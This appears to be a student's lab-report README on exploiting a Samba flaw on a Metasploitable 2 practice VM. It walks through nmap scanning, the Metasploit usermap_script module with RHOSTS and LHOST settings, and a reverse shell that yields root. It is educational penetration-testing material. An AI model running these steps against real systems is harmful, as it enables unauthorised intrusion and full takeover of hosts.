# cybersecurity-SMBlabs
Hands-on SMB (Samba) exploitation performed in a personal lab using Kali Linux and Metasploitable 2 | Demonstrates scanning, enumeration, and exploitation using Metasploit 

# SMB Exploitation Lab Report (Metasploitable 2)

## Objective
The objective of this lab is to identify and exploit an SMB (Server Message Block) vulnerability in a controlled environment using Kali Linux as the attacker machine and Metasploitable 2 as the target. The goal is to gain unauthorized access and understand the exploitation process.

---

## Tools Used
- Kali Linux (Attacker Machine)
- Metasploitable 2 (Target Machine)
- Nmap (Network Scanning)
- Metasploit Framework (Exploitation)

---

## Lab Environment
- Attacker IP: <192.168.X.X>
- Target IP: <192.168.X.X>
- Network Type: Host-Only Adapter

---

## Step 1: Network Scanning

Command:

nmap -sV 192.168.X.X

Explaination:
The Nmap is used to identify open ports and running services on the target machine.

Results:
Port 139/tcp open (NetBIOS)
Port 445/tcp open (SMB)
Service detected: samba

## Step 2: Lunch Metasploit
Command:

msfconsole

Explaination: 
Metasploit Framework is used to search, configure, and execute exploits.

## Step 3: Search for SMB Exploit
Command:

search usermap

Explaination:
Searches for available exploits related to samba vulnerabilities.
Results:
Found: exploit/multi/samba/usermap_script

## Step 4: Select Exploit Module 
Command:

use exploit/multi/samba/usermap_script

Explaination:
This modules exploits a vulnerability in samba that allows remote command execution.

## Step 5: Configure Target (RHOSTS)
command:

set RHOSTS 192.168.X.X

Explaination: 
RHOSTS specifies the target machines IP address

## Step 6: Configure Local Host (LHOSTS)
Command:

set LHOST 192.168.X.X

Explaination: 
LHOST is the attackers IP address where the reverse connection will be established.

## Step 7: Execute Exploit
Command:

run

Explaination:
Executes the exploit against the target system.
Results:
Command shell session opened

## Step 8: Gain Shell Access
Command:

whoami

Explaination:
Confirms access level on the target system.
Results:
root access obtained.

## Step 9: System Information
Command:

uname -a 

Explaination:
Displays system information of the compromised machine.
Result:
Linux Metasploitable system identified.

Final Result:

Successfully exploited SMB vulnerability
Gained remote shell access
Achieved root-level access on target system 

Learning Outcomes:

Learned how to perform network scanning using Nmap
Understood SMB/Samba vulnerabilities
Practiced exploitation using Metasploit
Gained hands-on experience in penetration testing workflow

Disclaimer:

This lab was conducted in a controlled environment for educatinal purposes only. 
